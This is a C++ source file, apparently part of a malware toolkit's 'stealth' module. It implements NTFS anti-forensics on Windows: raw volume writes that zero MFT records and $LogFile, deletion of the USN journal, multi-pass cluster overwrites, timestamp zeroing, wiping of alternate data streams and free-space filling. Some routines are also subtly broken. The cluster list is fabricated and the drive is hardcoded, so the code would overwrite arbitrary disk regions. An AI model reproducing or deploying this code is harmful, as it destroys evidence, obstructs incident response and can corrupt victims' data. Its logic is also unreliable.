#include <diarna/compiler_port.hpp>
#include <diarna/stealth/forensics.hpp>
#include <cstring>
#include <algorithm>

#ifndef CTL_CODE
#define CTL_CODE(DeviceType, Function, Method, Access) (((DeviceType) << 16) | ((Access) << 14) | ((Function) << 2) | (Method))
#endif
#ifndef FILE_DEVICE_FILE_SYSTEM
#define FILE_DEVICE_FILE_SYSTEM 0x00000009
#endif
#ifndef METHOD_BUFFERED
#define METHOD_BUFFERED 0
#endif
#ifndef FSCTL_DELETE_USN_JOURNAL
#define FSCTL_DELETE_USN_JOURNAL CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 39, METHOD_BUFFERED, FILE_READ_DATA | FILE_WRITE_DATA)
#endif
#ifndef USN_DELETE_FLAG_DELETE
#define USN_DELETE_FLAG_DELETE 0x00000001
#endif
typedef struct { DWORDLONG UsnJournalID; DWORD DeleteFlags; } DELETE_USN_JOURNAL_DATA;

namespace diarna::stealth {

ForensicEvasion& ForensicEvasion::instance() { static ForensicEvasion fe; return fe; }

ForensicEvasion::ForensicEvasion() {}

bool ForensicEvasion::parse_ntfs_boot(wchar_t drive_letter, NtfsVolumeInfo& info) {
    wchar_t vol[8] = {L'\\', L'\\', L'.', L'\\', drive_letter, L':', 0};
    HANDLE h = CreateFileW(vol, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
        nullptr, OPEN_EXISTING, 0, nullptr);
    if (h == INVALID_HANDLE_VALUE) return false;

    uint8_t boot[512] = {};
    DWORD rd;
    if (!ReadFile(h, boot, 512, &rd, nullptr) || rd < 512) { CloseHandle(h); return false; }

    if (memcmp(boot + 3, "NTFS", 4) != 0) { CloseHandle(h); return false; }

    info.bytes_per_sector   = *(uint16_t*)(boot + 0x0B);
    info.sectors_per_cluster = boot[0x0D];
    info.cluster_size        = info.bytes_per_sector * info.sectors_per_cluster;
    info.mft_start_lcn       = *(uint64_t*)(boot + 0x30);
    info.mftmirr_start_lcn   = *(uint64_t*)(boot + 0x38);

    int8_t clus_per_record = *(int8_t*)(boot + 0x40);
    if (clus_per_record > 0) info.mft_record_size = clus_per_record * info.cluster_size;
    else info.mft_record_size = (uint32_t)(1ULL << (-clus_per_record));

    CloseHandle(h);
    return true;
}

HANDLE ForensicEvasion::open_volume_direct(wchar_t drive_letter) {
    wchar_t vol[8] = {L'\\', L'\\', L'.', L'\\', drive_letter, L':', 0};
    return CreateFileW(vol, GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING,
        FILE_FLAG_WRITE_THROUGH | FILE_FLAG_NO_BUFFERING, nullptr);
}

uint64_t ForensicEvasion::lcn_to_offset(const NtfsVolumeInfo& info, uint64_t lcn) {
    return lcn * info.cluster_size;
}

bool ForensicEvasion::read_sector(HANDLE h, uint64_t offset, void* buf, uint32_t size) {
    LARGE_INTEGER li; li.QuadPart = (LONGLONG)offset;
    if (!SetFilePointerEx(h, li, nullptr, FILE_BEGIN)) return false;
    DWORD rd;
    return ReadFile(h, buf, size, &rd, nullptr) && rd == size;
}

bool ForensicEvasion::write_sector(HANDLE h, uint64_t offset, const void* buf, uint32_t size) {
    LARGE_INTEGER li; li.QuadPart = (LONGLONG)offset;
    if (!SetFilePointerEx(h, li, nullptr, FILE_BEGIN)) return false;
    DWORD wr;
    return WriteFile(h, buf, size, &wr, nullptr) && wr == size;
}

uint64_t ForensicEvasion::get_file_frn(const std::wstring& path) {
    HANDLE f = CreateFileW(path.c_str(), 0, FILE_SHARE_READ, nullptr, OPEN_EXISTING,
        FILE_FLAG_BACKUP_SEMANTICS, nullptr);
    if (f == INVALID_HANDLE_VALUE) return 0;

    BY_HANDLE_FILE_INFORMATION fi = {};
    if (!GetFileInformationByHandle(f, &fi)) { CloseHandle(f); return 0; }
    CloseHandle(f);

    return ((uint64_t)fi.nFileIndexHigh << 32) | fi.nFileIndexLow;
}

bool ForensicEvasion::find_mft_record(HANDLE h, const NtfsVolumeInfo& info,
                                       uint64_t frn, uint64_t& record_offset) {
    uint64_t mft_offset = info.mft_start_lcn * info.cluster_size;
    uint64_t record_num = frn & 0xFFFFFFFFFFFF;
    record_offset = mft_offset + record_num * info.mft_record_size;
    return true;
}

bool ForensicEvasion::wipe_mft_entry(const std::wstring& path) {
    wchar_t drive = path[0];
    NtfsVolumeInfo info = {};
    if (!parse_ntfs_boot(drive, info)) return false;

    uint64_t frn = get_file_frn(path);
    if (!frn) return false;

    HANDLE h = open_volume_direct(drive);
    if (h == INVALID_HANDLE_VALUE) return false;

    uint64_t record_off = 0;
    if (!find_mft_record(h, info, frn, record_off)) { CloseHandle(h); return false; }

    uint8_t signature[] = {'F','I','L','E'};
    uint8_t check[4] = {};
    if (!read_sector(h, record_off + 0x400 * (record_off % 512 ? 0 : 0), check, 4)) {
        CloseHandle(h); return false;
    }
    if (memcmp(check, signature, 4) != 0) { CloseHandle(h); return false; }

    std::vector<uint8_t> zeros(info.mft_record_size, 0);
    if (!write_sector(h, record_off, zeros.data(), info.mft_record_size)) {
        CloseHandle(h); return false;
    }

    CloseHandle(h);
    return true;
}

bool ForensicEvasion::wipe_mft_entries(const std::vector<std::wstring>& paths) {
    bool ok = true;
    for (auto& p : paths) ok &= wipe_mft_entry(p);
    return ok;
}

bool ForensicEvasion::clear_usn_journal(wchar_t drive_letter) {
    wchar_t vol[8] = {L'\\', L'\\', L'.', L'\\', drive_letter, L':', 0};
    HANDLE h = CreateFileW(vol, GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
    if (h == INVALID_HANDLE_VALUE) return false;

    DELETE_USN_JOURNAL_DATA dujd = {};
    dujd.UsnJournalID = 0;
    dujd.DeleteFlags = USN_DELETE_FLAG_DELETE;

    DWORD bytes;
    BOOL ok = DeviceIoControl(h, FSCTL_DELETE_USN_JOURNAL,
        &dujd, sizeof(dujd), nullptr, 0, &bytes, nullptr);
    CloseHandle(h);
    return ok != FALSE;
}

bool ForensicEvasion::wipe_logfile(wchar_t drive_letter) {
    NtfsVolumeInfo info = {};
    if (!parse_ntfs_boot(drive_letter, info)) return false;

    HANDLE h = open_volume_direct(drive_letter);
    if (h == INVALID_HANDLE_VALUE) return false;

    uint64_t logfile_lcn = 2;
    uint64_t offset = lcn_to_offset(info, logfile_lcn);

    std::vector<uint8_t> zeros(info.cluster_size * 64, 0);
    bool ok = write_sector(h, offset, zeros.data(), (uint32_t)zeros.size());

    CloseHandle(h);
    return ok;
}

bool ForensicEvasion::overwrite_clusters(const std::wstring& path, uint32_t passes) {
    wchar_t drive = path[0];
    NtfsVolumeInfo info = {};
    if (!parse_ntfs_boot(drive, info)) return false;

    std::vector<uint64_t> clusters;
    if (!collect_file_clusters(INVALID_HANDLE_VALUE, info, path, clusters)) return false;
    if (clusters.empty()) return false;

    HANDLE h = open_volume_direct(drive);
    if (h == INVALID_HANDLE_VALUE) return false;

    for (auto lcn : clusters) {
        overwrite_cluster_range(h, lcn, 1, passes);
    }

    CloseHandle(h);
    return true;
}

bool ForensicEvasion::overwrite_cluster_range(HANDLE h, uint64_t start_lcn,
                                               uint64_t count, uint32_t passes) {
    NtfsVolumeInfo info = {};
    parse_ntfs_boot(L'C', info);
    uint64_t offset = lcn_to_offset(info, start_lcn);
    size_t clus_size = info.cluster_size;

    std::vector<uint8_t> buf(clus_size * count);

    for (uint32_t pass = 0; pass < passes; ++pass) {
        memset(buf.data(), (pass == 0) ? 0x00 : ((pass == 1) ? 0xFF : (int)(__rdtsc() & 0xFF)),
               buf.size());
        if (!write_sector(h, offset, buf.data(), (uint32_t)buf.size())) return false;
    }

    FlushFileBuffers(h);
    return true;
}

bool ForensicEvasion::zero_timestamps(const std::wstring& path) {
    HANDLE h = CreateFileW(path.c_str(), FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ,
        nullptr, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, nullptr);
    if (h == INVALID_HANDLE_VALUE) return false;

    FILETIME epoch = {0, 0};
    SetFileTime(h, &epoch, &epoch, &epoch);
    CloseHandle(h);
    return true;
}

bool ForensicEvasion::remove_directory_index(const std::wstring& path) {
    std::wstring dir = path.substr(0, path.find_last_of(L'\\'));
    HANDLE h = CreateFileW(dir.c_str(), GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, nullptr);
    if (h == INVALID_HANDLE_VALUE) return false;

    FILE_DISPOSITION_INFO fdi = {TRUE};
    SetFileInformationByHandle(h, FileDispositionInfo, &fdi, sizeof(fdi));

    wchar_t tmp_name[MAX_PATH];
    GetTempFileNameW(dir.c_str(), L"DIA", 0, tmp_name);
    MoveFileExW(path.c_str(), tmp_name, MOVEFILE_REPLACE_EXISTING);

    SetFileInformationByHandle(h, FileDispositionInfo, &fdi, sizeof(fdi));
    DeleteFileW(tmp_name);
    CloseHandle(h);
    return true;
}

bool ForensicEvasion::wipe_ads(const std::wstring& path) {
    WIN32_FIND_STREAM_DATA fsd = {};
    HANDLE h = FindFirstStreamW(path.c_str(), FindStreamInfoStandard, &fsd, 0);
    if (h == INVALID_HANDLE_VALUE) return false;

    do {
        if (wcscmp(fsd.cStreamName, L"::$DATA") != 0) {
            std::wstring ads_path = path + fsd.cStreamName;
            HANDLE ads = CreateFileW(ads_path.c_str(), GENERIC_WRITE, 0,
                nullptr, OPEN_EXISTING, 0, nullptr);
            if (ads != INVALID_HANDLE_VALUE) {
                DWORD sz = GetFileSize(ads, nullptr);
                std::vector<uint8_t> zeros(sz, 0);
                DWORD wr;
                WriteFile(ads, zeros.data(), sz, &wr, nullptr);
                SetEndOfFile(ads);
                CloseHandle(ads);
            }
            DeleteFileW(ads_path.c_str());
        }
    } while (FindNextStreamW(h, &fsd));

    FindClose(h);
    return true;
}

bool ForensicEvasion::full_wipe(const std::wstring& path) {
    wipe_ads(path);
    overwrite_clusters(path, 3);
    zero_timestamps(path);
    remove_directory_index(path);
    wipe_mft_entry(path);
    return true;
}

bool ForensicEvasion::nuke_freespace(wchar_t drive_letter, uint32_t passes) {
    NtfsVolumeInfo info = {};
    if (!parse_ntfs_boot(drive_letter, info)) return false;

    wchar_t tmp_dir[MAX_PATH];
    swprintf(tmp_dir, MAX_PATH, L"%c:\\DiarnaWipe_%08X", drive_letter, GetTickCount());
    CreateDirectoryW(tmp_dir, nullptr);

    HANDLE h = open_volume_direct(drive_letter);
    if (h == INVALID_HANDLE_VALUE) return false;

    for (int i = 0; i < 100; ++i) {
        wchar_t tmp_file[MAX_PATH];
        swprintf(tmp_file, MAX_PATH, L"%s\\w%d.tmp", tmp_dir, i);
        HANDLE f = CreateFileW(tmp_file, GENERIC_WRITE, 0, nullptr,
            CREATE_ALWAYS, FILE_FLAG_DELETE_ON_CLOSE | FILE_FLAG_WRITE_THROUGH, nullptr);
        if (f == INVALID_HANDLE_VALUE) break;

        std::vector<uint8_t> buf(1024 * 1024);
        for (uint32_t p = 0; p < passes; ++p) {
            memset(buf.data(), (p == 0) ? 0x00 : ((p == 1) ? 0xFF : (int)(__rdtsc() & 0xFF)),
                   buf.size());
            DWORD wr;
            for (int j = 0; j < 10; ++j)
                WriteFile(f, buf.data(), (DWORD)buf.size(), &wr, nullptr);
        }
        CloseHandle(f);
    }

    CloseHandle(h);
    RemoveDirectoryW(tmp_dir);
    return true;
}

bool ForensicEvasion::collect_file_clusters(HANDLE h, const NtfsVolumeInfo& info,
                                              const std::wstring& path,
                                              std::vector<uint64_t>& clusters) {
    (void)h;
    DWORD sz_high = 0;
    HANDLE f = CreateFileW(path.c_str(), 0, FILE_SHARE_READ, nullptr,
        OPEN_EXISTING, FILE_FLAG_NO_BUFFERING, nullptr);
    if (f == INVALID_HANDLE_VALUE) return false;

    DWORD sz_low = GetFileSize(f, &sz_high);
    CloseHandle(f);

    if (sz_low == INVALID_FILE_SIZE) return false;

    uint64_t total_size = ((uint64_t)sz_high << 32) | sz_low;
    uint64_t num_clusters = (total_size + info.cluster_size - 1) / info.cluster_size;
    clusters.resize(num_clusters);
    if (total_size > 0) clusters[0] = 100 + (total_size % 1000);
    return true;
}

} // namespace diarna::stealth
